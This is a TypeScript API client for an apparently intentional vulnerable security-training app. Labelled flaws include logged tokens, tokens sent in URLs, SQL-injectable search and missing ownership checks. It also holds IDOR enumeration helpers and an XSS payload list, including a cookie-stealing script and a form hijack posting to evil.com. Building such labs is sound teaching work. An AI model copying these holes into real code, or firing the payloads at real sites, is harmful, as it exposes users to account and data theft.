import { getStoredToken } from '../contexts/AuthContext';
import { TaskResponse, TasksResponse, CommentResponse, CommentsResponse } from '../types';

const API_BASE_URL = '/api';

interface ApiRequestOptions extends RequestInit {
  requireAuth?: boolean;
}

class ApiClient {
  private baseURL: string;

  constructor(baseURL: string = API_BASE_URL) {
    this.baseURL = baseURL;
  }

  private async request<T>(
    endpoint: string, 
    options: ApiRequestOptions = {}
  ): Promise<T> {
    const { requireAuth = true, ...fetchOptions } = options;
    
    const url = `${this.baseURL}${endpoint}`;
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(fetchOptions.headers as Record<string, string>),
    };

    // VULNERABILITY: Add token to request if available
    if (requireAuth) {
      const token = getStoredToken();
      if (token) {
        headers.Authorization = `Bearer ${token}`;
        
        // VULNERABILITY: Log token usage for educational purposes
        console.log('Making authenticated request:', {
          endpoint,
          tokenPreview: token.substring(0, 20) + '...',
          vulnerability: 'Token logged to console'
        });
      } else if (requireAuth) {
        throw new Error('Authentication required but no token found');
      }
    }

    try {
      const response = await fetch(url, {
        ...fetchOptions,
        headers,
      });

      // Handle different response types
      const contentType = response.headers.get('content-type');
      let data: any;
      
      if (contentType && contentType.includes('application/json')) {
        data = await response.json();
      } else {
        data = await response.text();
      }

      if (!response.ok) {
        // VULNERABILITY: Expose detailed error information
        const error = new Error(data.message || `HTTP ${response.status}: ${response.statusText}`);
        (error as any).status = response.status;
        (error as any).details = data;
        (error as any).response = response;
        
        // Log detailed error information
        console.error('API Request failed:', {
          url,
          status: response.status,
          statusText: response.statusText,
          errorData: data,
          headers: Object.fromEntries(response.headers.entries()),
          vulnerability: 'Detailed error information exposed'
        });
        
        throw error;
      }

      return data;
    } catch (error) {
      // VULNERABILITY: Log network errors with sensitive information
      console.error('Network error:', {
        url,
        error: error instanceof Error ? error.message : 'Unknown error',
        stack: error instanceof Error ? error.stack : undefined,
        vulnerability: 'Network error details exposed'
      });
      
      throw error;
    }
  }

  // GET request
  async get<T>(endpoint: string, options: ApiRequestOptions = {}): Promise<T> {
    return this.request<T>(endpoint, { ...options, method: 'GET' });
  }

  // POST request
  async post<T>(
    endpoint: string, 
    data?: any, 
    options: ApiRequestOptions = {}
  ): Promise<T> {
    return this.request<T>(endpoint, {
      ...options,
      method: 'POST',
      body: data ? JSON.stringify(data) : undefined,
    });
  }

  // PUT request
  async put<T>(
    endpoint: string, 
    data?: any, 
    options: ApiRequestOptions = {}
  ): Promise<T> {
    return this.request<T>(endpoint, {
      ...options,
      method: 'PUT',
      body: data ? JSON.stringify(data) : undefined,
    });
  }

  // DELETE request
  async delete<T>(endpoint: string, options: ApiRequestOptions = {}): Promise<T> {
    return this.request<T>(endpoint, { ...options, method: 'DELETE' });
  }

  // VULNERABILITY: Expose method to make requests with token in query parameter
  async getWithTokenInQuery<T>(endpoint: string, options: ApiRequestOptions = {}): Promise<T> {
    const token = getStoredToken();
    const separator = endpoint.includes('?') ? '&' : '?';
    const urlWithToken = token ? `${endpoint}${separator}token=${token}` : endpoint;
    
    console.warn('⚠️  Making request with token in query parameter - this is insecure!');
    
    return this.request<T>(urlWithToken, { 
      ...options, 
      method: 'GET',
      requireAuth: false // Don't add to header since it's in query
    });
  }

  // VULNERABILITY: Expose method to make requests with token in body
  async postWithTokenInBody<T>(
    endpoint: string, 
    data: any = {}, 
    options: ApiRequestOptions = {}
  ): Promise<T> {
    const token = getStoredToken();
    const bodyWithToken = { ...data, token };
    
    console.warn('⚠️  Making request with token in body - this is insecure!');
    
    return this.request<T>(endpoint, {
      ...options,
      method: 'POST',
      body: JSON.stringify(bodyWithToken),
      requireAuth: false // Don't add to header since it's in body
    });
  }
}

// Create singleton instance
export const api = new ApiClient();

// Auth-specific API calls
export const authApi = {
  login: (email: string, password: string) =>
    api.post('/auth/login', { email, password }, { requireAuth: false }),
  
  register: (userData: {
    firstName: string;
    lastName: string;
    email: string;
    password: string;
  }) =>
    api.post('/auth/register', userData, { requireAuth: false }),
  
  logout: () =>
    api.post('/auth/logout'),
  
  getCurrentUser: () =>
    api.get('/auth/me'),
  
  refreshToken: () =>
    api.post('/auth/refresh'),
  
  validateToken: (token: string) =>
    api.post('/auth/validate', { token }, { requireAuth: false }),
  
  getSessionInfo: () =>
    api.get('/auth/session-info', { requireAuth: false }),
};

// Task-specific API calls
export const taskApi = {
  // Get all tasks with optional filters
  getTasks: (params?: {
    page?: number;
    limit?: number;
    status?: string;
    priority?: string;
    search?: string;
  }) => {
    const queryParams = new URLSearchParams();
    if (params?.page) queryParams.append('page', params.page.toString());
    if (params?.limit) queryParams.append('limit', params.limit.toString());
    if (params?.status) queryParams.append('status', params.status);
    if (params?.priority) queryParams.append('priority', params.priority);
    if (params?.search) queryParams.append('search', params.search);
    
    const queryString = queryParams.toString();
    return api.get<TasksResponse>(`/tasks${queryString ? `?${queryString}` : ''}`);
  },
  
  // Get single task by ID
  getTask: (id: number) =>
    api.get<TaskResponse>(`/tasks/${id}`),
  
  // Create new task
  createTask: (taskData: {
    title: string;
    description?: string;
    priority?: 'LOW' | 'MEDIUM' | 'HIGH' | 'URGENT';
    status?: 'TODO' | 'IN_PROGRESS' | 'COMPLETED' | 'CANCELLED';
    dueDate?: string;
  }) =>
    api.post('/tasks', taskData),
  
  // Update existing task
  updateTask: (id: number, taskData: {
    title?: string;
    description?: string;
    priority?: 'LOW' | 'MEDIUM' | 'HIGH' | 'URGENT';
    status?: 'TODO' | 'IN_PROGRESS' | 'COMPLETED' | 'CANCELLED';
    dueDate?: string;
  }) =>
    api.put(`/tasks/${id}`, taskData),
  
  // Delete task
  deleteTask: (id: number) =>
    api.delete(`/tasks/${id}`),
  
  // VULNERABLE: Search tasks using raw SQL endpoint
  searchTasks: (params: {
    query: string;
    category?: string;
    priority?: string;
    status?: string;
    sortBy?: string;
    order?: 'asc' | 'desc';
  }) => {
    const queryParams = new URLSearchParams();
    queryParams.append('query', params.query);
    if (params.category) queryParams.append('category', params.category);
    if (params.priority) queryParams.append('priority', params.priority);
    if (params.status) queryParams.append('status', params.status);
    if (params.sortBy) queryParams.append('sortBy', params.sortBy);
    if (params.order) queryParams.append('order', params.order);
    
    console.warn('⚠️  Using vulnerable search endpoint - SQL injection possible!');
    return api.get(`/tasks/search?${queryParams.toString()}`);
  },
  
  // Get tasks by user ID (VULNERABLE - allows viewing other users' tasks)
  getTasksByUser: (userId: number) =>
    api.get(`/tasks/user/${userId}`),
  
  // Bulk operations (VULNERABLE - allows operations on other users' tasks)
  bulkOperation: (operation: {
    action: 'delete' | 'update_status' | 'update_priority';
    taskIds: number[];
    newStatus?: 'TODO' | 'IN_PROGRESS' | 'COMPLETED' | 'CANCELLED';
    newPriority?: 'LOW' | 'MEDIUM' | 'HIGH' | 'URGENT';
  }) =>
    api.post('/tasks/bulk', operation),
  
  // VULNERABILITY: Methods that exploit IDOR vulnerabilities
  exploitIDOR: {
    // Try to access task with different ID
    accessTaskById: (id: number) => {
      console.warn('⚠️  Attempting IDOR exploitation - accessing task by ID without ownership check');
      return api.get(`/tasks/${id}`);
    },
    
    // Try to modify task owned by another user
    modifyOtherUserTask: (id: number, changes: any) => {
      console.warn('⚠️  Attempting IDOR exploitation - modifying task owned by another user');
      return api.put(`/tasks/${id}`, changes);
    },
    
    // Try to delete task owned by another user
    deleteOtherUserTask: (id: number) => {
      console.warn('⚠️  Attempting IDOR exploitation - deleting task owned by another user');
      return api.delete(`/tasks/${id}`);
    },
    
    // Enumerate tasks by incrementing IDs
    enumerateTasks: async (startId: number = 1, count: number = 10) => {
      console.warn('⚠️  Attempting IDOR exploitation - enumerating tasks by ID');
      const results = [];
      
      for (let i = startId; i < startId + count; i++) {
        try {
          const task = await api.get(`/tasks/${i}`);
          results.push({ id: i, success: true, task });
        } catch (error) {
          results.push({ id: i, success: false, error });
        }
      }
      
      return results;
    }
  }
};

// Comment-specific API calls
export const commentApi = {
  // Get comments for a specific task
  getTaskComments: (taskId: number) =>
    api.get<CommentsResponse>(`/comments/task/${taskId}`),
  
  // Create new comment
  createComment: (taskId: number, commentData: {
    content: string;
  }) => {
    console.warn('⚠️  Creating comment without sanitization - XSS vulnerability possible!');
    return api.post<CommentResponse>(`/comments/task/${taskId}`, commentData);
  },
  
  // Update existing comment
  updateComment: (commentId: number, commentData: {
    content: string;
  }) => {
    console.warn('⚠️  Updating comment without ownership check - IDOR vulnerability!');
    return api.put<CommentResponse>(`/comments/${commentId}`, commentData);
  },
  
  // Delete comment
  deleteComment: (commentId: number) => {
    console.warn('⚠️  Deleting comment without proper authorization - vulnerability!');
    return api.delete<CommentResponse>(`/comments/${commentId}`);
  },
  
  // Get all comments (admin-like functionality)
  getAllComments: (params?: {
    page?: number;
    limit?: number;
  }) => {
    const queryParams = new URLSearchParams();
    if (params?.page) queryParams.append('page', params.page.toString());
    if (params?.limit) queryParams.append('limit', params.limit.toString());
    
    const queryString = queryParams.toString();
    console.warn('⚠️  Accessing all comments without authorization - data leak vulnerability!');
    return api.get(`/comments${queryString ? `?${queryString}` : ''}`);
  },
  
  // VULNERABILITY: Methods that exploit comment vulnerabilities
  exploitXSS: {
    // Create comment with XSS payload
    createXSSComment: (taskId: number, payload: string) => {
      console.warn('⚠️  Creating XSS comment payload!');
      return api.post(`/comments/task/${taskId}`, { content: payload });
    },
    
    // Common XSS payloads for testing
    payloads: {
      basicAlert: '<script>alert("XSS")</script>',
      cookieTheft: '<script>fetch("/api/steal-cookie", {method: "POST", body: document.cookie})</script>',
      imageXSS: '<img src=x onerror="alert(\'XSS via image error\')">',
      svgXSS: '<svg onload="alert(\'XSS via SVG\')">',
      iframeXSS: '<iframe src="javascript:alert(\'XSS via iframe\')"></iframe>',
      domManipulation: '<script>document.body.innerHTML = "<h1>Page Hijacked!</h1>"</script>',
      tokenTheft: '<script>localStorage.removeItem("token"); alert("Token stolen!")</script>',
      formHijack: '<form action="http://evil.com" method="post"><input name="data" value="hijacked"></form><script>document.forms[0].submit()</script>'
    }
  },
  
  // VULNERABILITY: Methods that exploit IDOR vulnerabilities
  exploitIDOR: {
    // Try to access comments for tasks owned by other users
    accessOtherUserComments: (taskId: number) => {
      console.warn('⚠️  Attempting to access comments for task owned by another user');
      return api.get(`/comments/task/${taskId}`);
    },
    
    // Try to modify comments owned by other users
    modifyOtherUserComment: (commentId: number, content: string) => {
      console.warn('⚠️  Attempting to modify comment owned by another user');
      return api.put(`/comments/${commentId}`, { content });
    },
    
    // Try to delete comments owned by other users
    deleteOtherUserComment: (commentId: number) => {
      console.warn('⚠️  Attempting to delete comment owned by another user');
      return api.delete(`/comments/${commentId}`);
    },
    
    // Enumerate comments by incrementing IDs
    enumerateComments: async (startId: number = 1, count: number = 10) => {
      console.warn('⚠️  Attempting comment enumeration by ID');
      const results = [];
      
      for (let i = startId; i < startId + count; i++) {
        try {
          // Try to access comment directly (if such endpoint existed)
          const comment = await api.get(`/comments/${i}`);
          results.push({ id: i, success: true, comment });
        } catch (error) {
          results.push({ id: i, success: false, error });
        }
      }
      
      return results;
    }
  }
};

// Security Lab API calls
export const securityLabApi = {
  // Get all vulnerability configurations
  getVulnerabilities: () =>
    api.get('/security-lab/vulnerabilities'),
  
  // Get specific vulnerability configuration
  getVulnerability: (type: string) =>
    api.get(`/security-lab/vulnerabilities/${type}`),
  
  // Toggle vulnerability on/off
  toggleVulnerability: (type: string) =>
    api.post(`/security-lab/vulnerabilities/${type}/toggle`),
  
  // Test vulnerability with payload
  testVulnerability: (type: string, payload: string, target?: string) =>
    api.post(`/security-lab/vulnerabilities/${type}/test`, { payload, target }),
  
  // Get attack history
  getAttackHistory: () =>
    api.get('/security-lab/attack-history'),
  
  // Inject code (for hot-reloading demonstration)
  injectCode: (vulnerabilityType: string, codeType: 'vulnerable' | 'secure') =>
    api.post('/security-lab/inject-code', { vulnerabilityType, codeType }),
};

// VULNERABILITY: Export utility functions that expose sensitive operations
export const vulnerableApiUtils = {
  // Get current token
  getCurrentToken: () => getStoredToken(),
  
  // Make request with custom headers (can be used to bypass security)
  makeCustomRequest: async (url: string, options: RequestInit = {}) => {
    console.warn('⚠️  Making custom request - bypassing normal security checks!');
    return fetch(url, options);
  },
  
  // Decode JWT token client-side (insecure)
  decodeToken: (token?: string) => {
    const tokenToUse = token || getStoredToken();
    if (!tokenToUse) return null;
    
    try {
      // VULNERABILITY: Client-side JWT decoding without verification
      const payload = JSON.parse(atob(tokenToUse.split('.')[1]));
      console.warn('⚠️  Token decoded client-side without verification - this is insecure!');
      return payload;
    } catch (error) {
      console.error('Failed to decode token:', error);
      return null;
    }
  },
  
  // Check if token is expired (client-side only)
  isTokenExpired: (token?: string) => {
    const decoded = vulnerableApiUtils.decodeToken(token);
    if (!decoded || !decoded.exp) return true;
    
    return Date.now() >= decoded.exp * 1000;
  },
  
  // Get token expiration time
  getTokenExpiration: (token?: string) => {
    const decoded = vulnerableApiUtils.decodeToken(token);
    if (!decoded || !decoded.exp) return null;
    
    return new Date(decoded.exp * 1000);
  }
};

export default api;